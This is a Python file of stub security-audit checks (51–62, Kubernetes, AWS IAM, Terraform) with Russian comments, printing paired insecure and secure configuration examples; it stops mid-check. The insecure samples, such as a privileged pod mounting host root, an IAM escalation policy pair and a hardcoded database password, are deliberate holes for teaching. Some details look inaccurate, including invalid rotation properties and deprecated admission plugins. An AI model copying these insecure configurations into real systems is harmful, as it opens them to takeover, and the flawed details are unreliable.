"""
╔════════════════════════════════════════════════════════════════╗
║  🔐 Security Auditor — Hard Level Checks (51–75)              ║
║  CIS Kubernetes | Docker | AWS | GCP | Azure | CI/CD          ║
╚════════════════════════════════════════════════════════════════╝

❗ ВНИМАНИЕ: Все проверки — ЗАГЛУШКИ (stubs).
   Функции НЕ анализируют файлы, а демонстрируют формат отчёта.
   Реальную логику проверки нужно добавить позже.
"""

# ═══════════════════════════════════════════════════════════════
# 🔹 РАЗДЕЛ 1: COMPLEX KUBERNETES CHECKS (51–54)
# ═══════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 51: Cross-File Network Policy                   │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-K8S-5.3.2                                │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   Анализ цепочки Service → Ingress → NetPol   │
# └─────────────────────────────────────────────────────────────┘
def check_cross_file_network_policy_51():
    """
    Проверяет согласованность NetworkPolicy с Ingress/Service конфигурациями.
    При нахождении уязвимости выводит детальный отчёт.
    """
    print("⚠️  [HIGH] Cross-File Network Policy")
    print("  💥 Issue: Pod может быть достигнут из интернета через цепочку Service → Ingress → NetworkPolicy.")
    print("  🎯 Risk: Ложное чувство безопасности: есть NetworkPolicy, но трафик всё равно доходит до пода через публичный Ingress. Атакующий может эксплуатировать уязвимости в приложении.")
    print("  ❌ Insecure:")
    print("        # 01_pod.yaml")
    print("        apiVersion: v1")
    print("        kind: Pod")
    print("        metadata:")
    print("          labels:")
    print("            app: backend")
    print("        # 03_ingress.yaml - Ingress без TLS и ограничений")
    print("        apiVersion: networking.k8s.io/v1")
    print("        kind: Ingress")
    print("        spec:")
    print("          rules:")
    print("          - http:")
    print("              paths:")
    print("              - backend:")
    print("                  service:")
    print("                    name: backend-svc")
    print("                    port: { number: 80 }")
    print("        # ❌ Нет tls: секции, нет annotations для rate-limiting")
    print("  ✅ Secure:")
    print("        # Согласованная конфигурация:")
    print("        # 1. Ingress с TLS и ограничением по IP:")
    print("        spec:")
    print("          tls:")
    print("          - hosts: [api.example.com]")
    print("            secretName: api-tls")
    print("          rules:")
    print("          - host: api.example.com")
    print("            http: { paths: [...] }")
    print("          annotations:")
    print("            nginx.ingress.kubernetes.io/whitelist-source-range: \"10.0.0.0/8\"")
    print("        # 2. NetworkPolicy разрешает только от ingress-контроллера:")
    print("        spec:")
    print("          ingress:")
    print("          - from:")
    print("            - namespaceSelector: { matchLabels: { name: ingress-nginx } }")
    print("            - podSelector: { matchLabels: { app.kubernetes.io/name: ingress-nginx } }")
    print("            ports: [{ protocol: TCP, port: 8080 }]")
    print("  🛠️ Remediation:")
    print("      • Настройте согласованные NetworkPolicy для всех сервисов")
    print("      • Включите TLS на всех Ingress")
    print("      • Ограничьте трафик на уровне ingress-контроллера")
    print("      • Используйте podSelector в NetworkPolicy для точного контроля")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 52: IAM Privilege Escalation Path              │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-AWS-1.18                                 │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Комбинация политик позволяет эскалацию прав │
# └─────────────────────────────────────────────────────────────┘
def check_iam_privilege_escalation_path_52():
    """
    Проверяет комбинации IAM политик, позволяющие повышение привилегий.
    """
    print("⚠️  [CRITICAL] IAM Privilege Escalation Path")
    print("  💥 Issue: Комбинация политик IAM позволяет пользователю повысить свои привилегии.")
    print("  🎯 Risk: Privilege escalation: пользователь получает административные права, может создать новых пользователей, удалить логи, получить доступ ко всем ресурсам аккаунта.")
    print("  ❌ Insecure:")
    print("        # Политика 1: разрешает PassRole")
    print("        {")
    print('          "Effect": "Allow",')
    print('          "Action": "iam:PassRole",')
    print('          "Resource": "arn:aws:iam::123456789012:role/AdminRole"')
    print("        }")
    print("        # Политика 2: разрешает изменять политики")
    print("        {")
    print('          "Effect": "Allow",')
    print('          "Action": ["iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion"],')
    print('          "Resource": "arn:aws:iam::123456789012:policy/SelfPolicy"')
    print("        }")
    print("        # Комбинация: пользователь может создать версию политики с \"*\" правами")
    print("  ✅ Secure:")
    print("        # Принцип наименьших привилегий + условия:")
    print("        {")
    print('          "Effect": "Allow",')
    print('          "Action": "iam:PassRole",')
    print('          "Resource": "arn:aws:iam::123456789012:role/LimitedRole",')
    print('          "Condition": {')
    print('            "StringEquals": {')
    print('              "iam:PassedToService": "ec2.amazonaws.com"')
    print("            }")
    print("          }")
    print("        }")
    print("        # Запретить создание версий политик для не-админов:")
    print("        {")
    print('          "Effect": "Deny",')
    print('          "Action": ["iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion"],')
    print('          "Resource": "*",')
    print('          "Condition": {')
    print('            "ArnNotLike": {')
    print('              "aws:PrincipalArn": "arn:aws:iam::123456789012:role/Admin"')
    print("            }")
    print("          }")
    print("        }")
    print("  🛠️ Remediation:")
    print("      • Разделите PassRole и CreatePolicyVersion права")
    print("      • Добавьте условия (Condition) к IAM политикам")
    print("      • Запретите создание версий политик для обычных пользователей")
    print("      • Используйте IAM Access Analyzer для аудита")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 53: Service Account Token Abuse                │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-K8S-5.2.11                               │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   SA имеет избыточные права + авто-монтирование │
# └─────────────────────────────────────────────────────────────┘
def check_service_account_token_abuse_53():
    """
    Проверяет комбинацию избыточных прав ServiceAccount и автоматического монтирования токена.
    """
    print("⚠️  [HIGH] Service Account Token Abuse")
    print("  💥 Issue: ServiceAccount имеет избыточные права и используется в поде с авто-монтированием токена.")
    print("  🎯 Risk: Компрометация одного пода = доступ ко всем секретам namespace. Кража токенов баз данных, API-ключей, TLS-сертификатов.")
    print("  ❌ Insecure:")
    print("        # 02_serviceaccount.yaml")
    print("        apiVersion: v1")
    print("        kind: ServiceAccount")
    print("        metadata:")
    print("          name: app-sa")
    print("          namespace: default")
    print("        # automountServiceAccountToken: true (по умолчанию)")
    print("        # 03_rolebinding.yaml - SA имеет доступ ко всем секретам")
    print("        apiVersion: rbac.authorization.k8s.io/v1")
    print("        kind: RoleBinding")
    print("        metadata:")
    print("          name: sa-secrets-access")
    print("        roleRef:")
    print("          kind: Role")
    print("          name: secret-reader")
    print("        subjects:")
    print("        - kind: ServiceAccount")
    print("          name: app-sa")
    print("          namespace: default")
    print("        # Role с широкими правами:")
    print("        rules:")
    print("        - apiGroups: [\"\"]")
    print("          resources: [\"secrets\"]")
    print("          verbs: [\"get\", \"list\", \"watch\"]  # Чтение всех секретов!")
    print("  ✅ Secure:")
    print("        # 1. Отключить авто-монтирование токена:")
    print("        apiVersion: v1")
    print("        kind: ServiceAccount")
    print("        metadata:")
    print("          name: app-sa")
    print("        automountServiceAccountToken: false")
    print("        # 2. Ограничить права на конкретные секреты:")
    print("        apiVersion: rbac.authorization.k8s.io/v1")
    print("        kind: Role")
    print("        rules:")
    print("        - apiGroups: [\"\"]")
    print("          resources: [\"secrets\"]")
    print("          resourceNames: [\"app-specific-secret\"]  # Только нужный секрет!")
    print("          verbs: [\"get\"]")
    print("        # 3. Если токен не нужен - не монтировать:")
    print("        spec:")
    print("          serviceAccountName: app-sa")
    print("          automountServiceAccountToken: false")
    print("  🛠️ Remediation:")
    print("      • Отключите automountServiceAccountToken для всех SA")
    print("      • Ограничьте RBAC права до конкретных ресурсов")
    print("      • Используйте отдельные SA для каждого приложения")
    print("      • Регулярно аудируйте RoleBinding")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 54: Lateral Movement Path                      │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   NIST-AC-4                                    │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Цепочка разрешений позволяет перемещение    │
# └─────────────────────────────────────────────────────────────┘
def check_lateral_movement_path_54():
    """
    Проверяет цепочки доверенных отношений между ресурсами, позволяющие горизонтальное перемещение.
    """
    print("⚠️  [CRITICAL] Lateral Movement Path")
    print("  💥 Issue: Цепочка разрешений позволяет перемещаться между ресурсами (VM → IAM → S3 → Lambda → EC2).")
    print("  🎯 Risk: Lateral movement: атакующий, получивший доступ к одной VM, может через цепочку доверенных отношений получить контроль над всей инфраструктурой.")
    print("  ❌ Insecure:")
    print("        # Цепочка атаки:")
    print("        # 1. EC2 с ролью:")
    print("        IamInstanceProfile:")
    print("          Arn: arn:aws:iam::123456789012:instance-profile/EC2-Role")
    print("        # 2. Role с правами на S3 и Lambda:")
    print("        Policies:")
    print("          Statement:")
    print("          - Effect: Allow")
    print("            Action: [\"s3:GetObject\", \"s3:PutObject\"]")
    print("            Resource: \"arn:aws:s3:::shared-bucket/*\"")
    print("          - Effect: Allow")
    print("            Action: [\"lambda:InvokeFunction\"]")
    print("            Resource: \"arn:aws:lambda:::function:*\"")
    print("        # 3. Bucket с политикой, разрешающей Lambda:")
    print("        BucketPolicy:")
    print("          Principal: { Service: lambda.amazonaws.com }")
    print("          Action: \"s3:GetObject\"")
    print("        # 4. Lambda с ролью для управления EC2:")
    print("        Role: arn:aws:iam::123456789012:role/Lambda-EC2-Admin")
    print("        Policy:")
    print("          Effect: Allow")
    print("          Action: [\"ec2:StartInstances\", \"ec2:StopInstances\"]")
    print("          Resource: \"*\"")
    print("        # Итог: EC2 → S3 → Lambda → ВСЕ EC2")
    print("  ✅ Secure:")
    print("        # Разрыв цепочки доверия:")
    print("        # 1. Принцип наименьших привилегий для каждой роли:")
    print("        #    EC2-Role: только чтение из конкретного S3 префикса")
    print("        #    Lambda-Role: только инвок конкретной функции, только определённые EC2")
    print("        # 2. Явные условия в политиках:")
    print("        \"Condition\": {")
    print("          \"StringEquals\": {")
    print("            \"s3:ExistingObjectTag/Environment\": \"production\",")
    print("            \"aws:SourceArn\": \"arn:aws:lambda:region:account:function:trusted-func\"")
    print("          }")
    print("        }")
    print("        # 3. Resource-based policies с ограничением источника")
    print("        # 4. Мониторинг и алертинг на аномальные вызовы")
    print("  🛠️ Remediation:")
    print("      • Применяйте принцип наименьших привилегий для каждой роли")
    print("      • Добавьте условия (Condition) к IAM политикам")
    print("      • Ограничьте Resource до конкретных ARN")
    print("      • Настройте мониторинг межсервисных вызовов")
    print()


# ═══════════════════════════════════════════════════════════════
# 🔹 РАЗДЕЛ 2: COMPLIANCE & GOVERNANCE CHECKS (55–58)
# ═══════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 55: Secret Rotation Compliance                 │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   NIST-IA-5.1                                  │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   Пароль старше 90 дней без автоматической ротации │
# └─────────────────────────────────────────────────────────────┘
def check_secret_rotation_compliance_55():
    """Проверяет соответствие политик ротации секретов требованиям безопасности."""
    print("⚠️  [HIGH] Secret Rotation Compliance")
    print("  💥 Issue: Пароль в Secrets Manager старше 90 дней без автоматической ротации.")
    print("  🎯 Risk: Устаревшие учётные данные: при компрометации злоумышленник имеет длительный доступ. Нарушение требований PCI-DSS, SOC2, GDPR.")
    print("  ❌ Insecure:")
    print("        # 01_secret.yaml - Secret без автоматической ротации")
    print("        Type: AWS::SecretsManager::Secret")
    print("        Properties:")
    print("          Name: prod/database/password")
    print("          # AutomaticRotationRules отсутствует!")
    print("        # Или:")
    print("        AutomaticRotationRules:")
    print("          Duration: 365  # Ротация раз в год (слишком редко!)")
    print("        # Фактический LastRotatedDate: 2024-01-01 (более 90 дней назад)")
    print("  ✅ Secure:")
    print("        # Настройка автоматической ротации:")
    print("        Type: AWS::SecretsManager::Secret")
    print("        Properties:")
    print("          Name: prod/database/password")
    print("          GenerateSecretString:")
    print("            SecretStringTemplate: !Sub '{\"username\": \"${DBUser}\"}'")
    print("            GenerateStringKey: \"password\"")
    print("            PasswordLength: 32")
    print("          AutomaticRotationRules:")
    print("            Duration: 90  # Ротация каждые 90 дней")
    print("          RotationRules:")
    print("            AutomaticallyAfterDays: 90")
    print("            RotationLambdaARN: !Ref RotationLambdaFunction")
    print("        # Дополнительно: CloudWatch Events для алерта")
    print("  🛠️ Remediation:")
    print("      • Включите автоматическую ротацию для всех секретов")
    print("      • Настройте RotationLambdaARN для кастомной ротации")
    print("      • Создайте алерты на неудачную ротацию")
    print("      • Регулярно аудируйте age секретов")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 56: Unused IAM Credentials                     │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-AWS-1.15                                 │
# │ ⚡ Критичность: 🟡 MEDIUM                                    │
# │ 📝 Описание:   IAM user с ключами, не использованными 90+ дней │
# └─────────────────────────────────────────────────────────────┘
def check_unused_iam_credentials_56():
    """Проверяет наличие неактивных IAM credentials старше 90 дней."""
    print("⚠️  [MEDIUM] Unused IAM Credentials")
    print("  💥 Issue: IAM user с ключами, не использованными 90+ дней.")
    print("  🎯 Risk: Неактивные ключи = 'спящая' уязвимость. При утечке таких ключей атакующий может действовать незамеченным, так как легитимной активности нет и аномалии сложнее детектировать.")
    print("  ❌ Insecure:")
    print("        # 01_iam_user.yaml - Пользователь с активными ключами")
    print("        Type: AWS::IAM::User")
    print("        Properties:")
    print("          UserName: legacy-service-account")
    print("        # 02_access_key.yaml - AccessKey создан 180 дней назад")
    print("        Type: AWS::IAM::AccessKey")
    print("        Properties:")
    print("          UserName: !Ref LegacyUser")
    print("          Status: Active")
    print("          CreatedDate: 2024-07-01")
    print("        # 03_cloudtrail_events.json - Нет событий использования ключа:")
    print("        { \"eventName\": [], \"lastUsedDate\": null }")
    print("        # Или последнее использование: 2024-07-15 (более 90 дней назад)")
    print("  ✅ Secure:")
    print("        # 1. Автоматическое отключение неиспользуемых ключей:")
    print("        #    Lambda функция, проверяющая AccessKeyLastUsed через IAM API")
    print("        #    и деактивирующая ключи, не использованные >90 дней")
    print("        # 2. Политика удаления:")
    print("        Type: AWS::IAM::User")
    print("        Properties:")
    print("          UserName: legacy-service-account")
    print("        # 02_access_key.yaml с условиями:")
    print("          Status: Inactive  # если не используется")
    print("        # 3. Мониторинг:")
    print("        Type: AWS::Config::ConfigRule")
    print("        Properties:")
    print("          ConfigRuleName: iam-unused-credentials-check")
    print("          Source:")
    print("            Owner: AWS")
    print("            SourceIdentifier: IAM_USER_UNUSED_CREDENTIALS_CHECK")
    print("  🛠️ Remediation:")
    print("      • Отключите ключи, не использованные 90+ дней")
    print("      • Настройте AWS Config rule для мониторинга")
    print("      • Внедрите процесс offboarding для ключей")
    print("      • Используйте временные credentials через STS")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 57: Kubernetes RBAC Overprivileged             │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-K8S-5.1.8                                │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   ClusterRole с verbs: ['*'] на resources: ['*'] │
# └─────────────────────────────────────────────────────────────┘
def check_kubernetes_rbac_overprivileged_57():
    """Проверяет наличие чрезмерно широких разрешений в Kubernetes RBAC."""
    print("⚠️  [CRITICAL] Kubernetes RBAC Overprivileged")
    print("  💥 Issue: ClusterRole с verbs: ['*'] на resources: ['*'].")
    print("  🎯 Risk: Полный контроль над кластером: чтение всех секретов, создание привилегированных подов, модификация RBAC, удаление критических ресурсов. Компрометация = потеря кластера.")
    print("  ❌ Insecure:")
    print("        # 01_clusterrole.yaml - Чрезмерно широкая роль")
    print("        apiVersion: rbac.authorization.k8s.io/v1")
    print("        kind: ClusterRole")
    print("        metadata:")
    print("          name: super-admin")
    print("        rules:")
    print("        - apiGroups: [\"*\"]      # Все группы API")
    print("          resources: [\"*\"]       # Все ресурсы")
    print("          verbs: [\"*\"]           # Все действия!")
    print("          nonResourceURLs: [\"*\"]")
    print("          verbs: [\"*\"]")
    print("        # 02_clusterrolebinding.yaml - Привязка к обычному пользователю")
    print("        apiVersion: rbac.authorization.k8s.io/v1")
    print("        kind: ClusterRoleBinding")
    print("        metadata:")
    print("          name: give-super-admin")
    print("        subjects:")
    print("        - kind: User")
    print("          name: developer@company.com  # Обычный разработчик!")
    print("  ✅ Secure:")
    print("        # Принцип наименьших привилегий:")
    print("        apiVersion: rbac.authorization.k8s.io/v1")
    print("        kind: ClusterRole")
    print("        metadata:")
    print("          name: app-deployer")
    print("        rules:")
    print("        # Только необходимые ресурсы и действия:")
    print("        - apiGroups: [\"apps\"]")
    print("          resources: [\"deployments\", \"replicasets\"]")
    print("          verbs: [\"get\", \"list\", \"watch\", \"create\", \"update\", \"patch\"]")
    print("          # ❌ Нет \"delete\", нет \"*\"")
    print("        - apiGroups: [\"\"]")
    print("          resources: [\"pods\", \"services\", \"configmaps\"]")
    print("          verbs: [\"get\", \"list\", \"create\", \"update\"]")
    print("          # ❌ Нет доступа к secrets, rbac, nodes")
    print("        # Привязка только к нужным сервис-аккаунтам:")
    print("        kind: ClusterRoleBinding")
    print("        subjects:")
    print("        - kind: ServiceAccount")
    print("          name: ci-cd-sa")
    print("          namespace: ci-cd")
    print("  🛠️ Remediation:")
    print("      • Замените wildcard на конкретные действия")
    print("      • Ограничьте resources до необходимых")
    print("      • Используйте ServiceAccount вместо User")
    print("      • Внедрите регулярный аудит RBAC")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 58: Role Binding to Default SA                 │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-K8S-5.1.9                                │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   RoleBinding на serviceAccountName: default  │
# └─────────────────────────────────────────────────────────────┘
def check_role_binding_to_default_sa_58():
    """Проверяет привязку ролей к сервис-аккаунту default."""
    print("⚠️  [HIGH] Role Binding to Default SA")
    print("  💥 Issue: RoleBinding на serviceAccountName: default.")
    print("  🎯 Risk: Неявное наследование прав: любой новый под, любой деплой без явного указания SA получает привилегии. Усложняет аудит и контроль доступа, увеличивает поверхность атаки.")
    print("  ❌ Insecure:")
    print("        # 01_rolebinding.yaml - Права на default ServiceAccount")
    print("        apiVersion: rbac.authorization.k8s.io/v1")
    print("        kind: RoleBinding")
    print("        metadata:")
    print("          name: grant-secrets-to-default")
    print("          namespace: production")
    print("        subjects:")
    print("        - kind: ServiceAccount")
    print("          name: default              # ❌ Опасно!")
    print("          namespace: production")
    print("        # Любой под в namespace production без явного serviceAccountName:")
    print("        apiVersion: v1")
    print("        kind: Pod")
    print("        metadata:")
    print("          name: any-pod")
    print("          namespace: production")
    print("        spec:")
    print("          # serviceAccountName не указан = используется \"default\"")
    print("          containers:")
    print("          - name: app")
    print("            image: nginx")
    print("        # Этот под автоматически получит права на чтение секретов!")
    print("  ✅ Secure:")
    print("        # 1. Никогда не привязывать роли к \"default\" SA:")
    print("        subjects:")
    print("        - kind: ServiceAccount")
    print("          name: app-specific-sa    # ✅ Конкретный, именованный SA")
    print("          namespace: production")
    print("        # 2. Создать специфичный SA для каждого приложения:")
    print("        apiVersion: v1")
    print("        kind: ServiceAccount")
    print("        metadata:")
    print("          name: app-specific-sa")
    print("          namespace: production")
    print("        automountServiceAccountToken: false")
    print("        # 3. Явно указывать SA в каждом поде:")
    print("        spec:")
    print("          serviceAccountName: app-specific-sa")
    print("  🛠️ Remediation:")
    print("      • Удалите все RoleBinding на default SA")
    print("      • Создайте именованные ServiceAccount для каждого приложения")
    print("      • Явно указывайте serviceAccountName в каждом Pod")
    print("      • Отключите automountServiceAccountToken по умолчанию")
    print()


# ═══════════════════════════════════════════════════════════════
# 🔹 РАЗДЕЛ 3: KUBERNETES ADMISSION & ESCAPE CHECKS (59–60)
# ═══════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 59: Admission Controller Disabled              │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-K8S-5.1.4                                │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   Отсутствуют критические admission-плагины   │
# └─────────────────────────────────────────────────────────────┘
def check_admission_controller_disabled_59():
    """Проверяет наличие критических admission-плагинов в конфигурации API Server."""
    print("⚠️  [HIGH] Admission Controller Disabled")
    print("  💥 Issue: Отсутствуют критические admission-плагины (PodSecurity, AlwaysPullImages).")
    print("  🎯 Risk: Отсутствие контроля на этапе создания ресурсов: пользователи могут запускать привилегированные контейнеры, использовать host-namespace, обходить ограничения безопасности.")
    print("  ❌ Insecure:")
    print("        # 01_apiserver_config.yaml - Конфигурация API Server")
    print("        apiVersion: v1")
    print("        kind: Pod")
    print("        metadata:")
    print("          name: kube-apiserver")
    print("          namespace: kube-system")
    print("        spec:")
    print("          containers:")
    print("          - name: kube-apiserver")
    print("            command:")
    print("            - kube-apiserver")
    print("            - --enable-admission-plugins=NodeRestriction,ServiceAccount")
    print("            # ❌ Нет PodSecurity, нет AlwaysPullImages, нет DenyEscalatingExec")
    print("        # 02_admission_plugins.yaml - Список включённых плагинов:")
    print("        enabled:")
    print("        - NodeRestriction")
    print("        - ServiceAccount")
    print("        # ❌ Отсутствуют:")
    print("        # - PodSecurity (или PodSecurityPolicy для старых версий)")
    print("        # - AlwaysPullImages")
    print("        # - DenyEscalatingExec")
    print("        # - SecurityContextDeny")
    print("  ✅ Secure:")
    print("        # Включить необходимые admission-плагины (K8s 1.23+):")
    print("        --enable-admission-plugins=NodeRestriction,ServiceAccount,PodSecurity,AlwaysPullImages,DenyEscalatingExec")
    print("        # Для PodSecurity admission настроить уровни через labels на namespace:")
    print("        apiVersion: v1")
    print("        kind: Namespace")
    print("        metadata:")
    print("          name: production")
    print("          labels:")
    print("            pod-security.kubernetes.io/enforce: restricted")
    print("            pod-security.kubernetes.io/audit: restricted")
    print("            pod-security.kubernetes.io/warn: restricted")
    print("        # Для старых версий использовать PodSecurityPolicy или OPA/Gatekeeper")
    print("  🛠️ Remediation:")
    print("      • Включите PodSecurity admission plugin")
    print("      • Настройте AlwaysPullImages для контроля образов")
    print("      • Используйте OPA/Gatekeeper для кастомных политик")
    print("      • Аудируйте конфигурацию API Server")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 60: Container Breakout Potential               │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-K8S-5.2.14                               │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Комбинация: privileged + hostPath + capabilities │
# └─────────────────────────────────────────────────────────────┘
def check_container_breakout_potential_60():
    """Проверяет опасные комбинации настроек безопасности контейнеров."""
    print("⚠️  [CRITICAL] Container Breakout Potential")
    print("  💥 Issue: Комбинация: privileged + hostPath + capabilities позволяет escape на хост.")
    print("  🎯 Risk: Container escape: злоумышленник может:\n"
          "    • Прочитать /etc/shadow, SSH-ключи, токены\n"
          "    • Запустить процесс на хосте, установить бэкдор\n"
          "    • Изменить конфигурацию ядра, отключить безопасность\n"
          "    • Получить полный контроль над узлом и кластером")
    print("  ❌ Insecure:")
    print("        # 01_pod.yaml - Опасная комбинация настроек")
    print("        apiVersion: v1")
    print("        kind: Pod")
    print("        metadata:")
    print("          name: dangerous-pod")
    print("        spec:")
    print("          containers:")
    print("          - name: app")
    print("            image: nginx")
    print("            securityContext:")
    print("              privileged: true                    # ✅ Полный доступ к хосту")
    print("              capabilities:")
    print("                add:")
    print("                - SYS_ADMIN                       # ✅ Монтирование ФС, управление ядром")
    print("                - NET_ADMIN                       # ✅ Изменение сетевых настроек")
    print("            volumeMounts:")
    print("            - name: host-root")
    print("              mountPath: /host")
    print("        # 02_hostpath_volume.yaml - Монтирование корня хоста")
    print("        volumes:")
    print("        - name: host-root")
    print("          hostPath:")
    print("            path: /                               # ✅ Доступ ко всей ФС хоста!")
    print("            type: Directory")
    print("  ✅ Secure:")
    print("        # Убрать все опасные настройки:")
    print("        spec:")
    print("          containers:")
    print("          - name: app")
    print("            image: nginx:1.21.0")
    print("            securityContext:")
    print("              privileged: false")
    print("              allowPrivilegeEscalation: false")
    print("              runAsNonRoot: true")
    print("              runAsUser: 1000")
    print("              capabilities:")
    print("                drop:")
    print("                - ALL")
    print("            # ✅ Без volumeMounts к hostPath")
    print("        # Если нужен доступ к хост-файлам - использовать максимально ограниченный путь:")
    print("        volumes:")
    print("        - name: config-volume")
    print("          hostPath:")
    print("            path: /etc/myapp/config  # ✅ Только конкретная директория")
    print("            type: Directory")
    print("        volumeMounts:")
    print("        - name: config-volume")
    print("          mountPath: /etc/config")
    print("          readOnly: true")
    print("  🛠️ Remediation:")
    print("      • Удалите privileged: true из всех подов")
    print("      • Не монтируйте hostPath к корню хоста")
    print("      • Используйте drop: ALL для capabilities")
    print("      • Включите AppArmor/SELinux профили")
    print()


# ═══════════════════════════════════════════════════════════════
# 🔹 РАЗДЕЛ 4: INFRASTRUCTURE AS CODE CHECKS (61–62)
# ═══════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 61: Terraform Hardcoded Secrets                │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-TF-1.1                                   │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Секреты зашиты прямо в код инфраструктуры   │
# └─────────────────────────────────────────────────────────────┘
def check_terraform_hardcoded_secrets_61():
    """Проверяет наличие хардкод-секретов в Terraform конфигурациях."""
    print("⚠️  [CRITICAL] Terraform Hardcoded Secrets")
    print("  💥 Issue: Секреты зашиты прямо в код инфраструктуры (.tf файлы).")
    print("  🎯 Risk: Утечка секретов через историю git, PR, бэкапы. Сложность ротации (нужно менять в коде и деплоить). Нарушение принципов безопасности и комплаенса.")
    print("  ❌ Insecure:")
    print("        # 01a_main_vulnerable.tf - Секрет прямо в ресурсе")
    print("        resource \"aws_db_instance\" \"prod\" {")
    print("          identifier = \"prod-db\"")
    print("          username   = \"admin\"")
    print("          password   = \"SuperSecret123!\"  # ❌ Хардкод пароля!")
    print("          engine     = \"postgres\"")
    print("        }")
    print("        # 02a_variables_vulnerable.tf - Переменная с дефолтным секретом")
    print("        variable \"db_password\" {")
    print("          type    = string")
    print("          default = \"SuperSecret123!\"  # ❌ Дефолтное значение = секрет в коде")
    print("          sensitive = false")
    print("        }")
    print("        # 03a_terraform_vulnerable.tfvars - Секрет в tfvars (может быть в git!)")
    print("        db_password = \"SuperSecret123!\"")
    print("  ✅ Secure:")
    print("        # 01b_main_secure.tf - Использование внешних источников")
    print("        resource \"aws_db_instance\" \"prod\" {")
    print("          identifier = \"prod-db\"")
    print("          username   = \"admin\"")
    print("          password   = var.db_password  # ✅ Ссылка на переменную")
    print("        }")
    print("        # 02b_variables_secure.tf - Переменная без дефолта, с флагом sensitive")
    print("        variable \"db_password\" {")
    print("          type        = string")
    print("          description = \"Database password (provide via env or secrets manager)\"")
    print("          sensitive   = true  # ✅ Не логировать значение")
    print("          # ❌ Нет default!")
    print("        }")
    print("        # 03b_terraform_secure.tfvars - НЕ коммитить в git!")
    print("        # Использовать .gitignore для *.tfvars")
    print("        # Или использовать backend secrets (Secrets Manager, Vault)")
    print("  🛠️ Remediation:")
    print("      • Удалите все hardcoded secrets из .tf файлов")
    print("      • Используйте Secrets Manager или Vault")
    print("      • Добавьте sensitive = true для переменных с секретами")
    print("      • Включите .gitignore для *.tfvars файлов")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 62: State File Public Access                   │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-TF-2.2                                   │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Terraform state файл доступен публично в S3 │
# └─────────────────────────────────────────────────────────────┘
def check_state_file_public_access_62():
    """Проверяет доступность Terraform state файлов в удалённом бэкенде."""
    print("⚠️  [CRITICAL] State File Public Access")
    print("  💥 Issue: Terraform state файл доступен публично в S3 bucket.")
    print("  🎯 Risk: terraform.tfstate содержит в открытом виде:\n"
          "    • Пароли баз данных, API-ключи, TLS private keys\n"
          "    • Конфигурации всех ресурсов, сетевые топологии\n"
          "    • Зависимости между ресурсами (граф атаки)\n"
          "  Публичный доступ = полная компрометация инфраструктуры.")
    print("  ❌ Insecure:")
    print("        # 01_backend.tf - S3 backend без шифрования и с публичным доступом")
    print("        terraform {")
    print("          backend \"s3\" {")
    print("            bucket = \"my-terraform-state\"")
    print("            key    = \"prod/terraform.tfstate\"")
    print("            region = \"us-east-1\"")
    print("            # ❌ Нет encrypt = true")
    print("            # ❌ Нет dynamodb_table для locking")
    print("          }")
    print("        }")
    print("        # 02a_s3_bucket_vulnerable.tf - Bucket с публичным ACL")
    print("        resource \"aws_s3_bucket\" \"terraform_state\" {")
    print("          bucket = \"my-terraform-state\"")
    print("          acl    = \"public-read\"  # ❌ Публичный доступ на чтение!")
    print("        }")
    print("        # 03a_bucket_policy_vulnerable.tf - Политика разрешает всем")
    print("        policy = jsonencode({")
    print("          Statement = [{")
    print("            Effect    = \"Allow\"")
    print("            Principal = \"*\"  # ❌ Любой пользователь!")
    print("            Action    = \"s3:GetObject\"")
    print("            Resource  = \"${aws_s3_bucket.terraform_state.arn}/*\"")
    print("          }]")
    print("        })")
    print("  ✅ Secure:")
    print("        # 01_backend.tf - Безопасная конфигурация")
    print("        terraform {")
    print("          backend \"s3\" {")
    print("            bucket         = \"my-terraform-state\"")
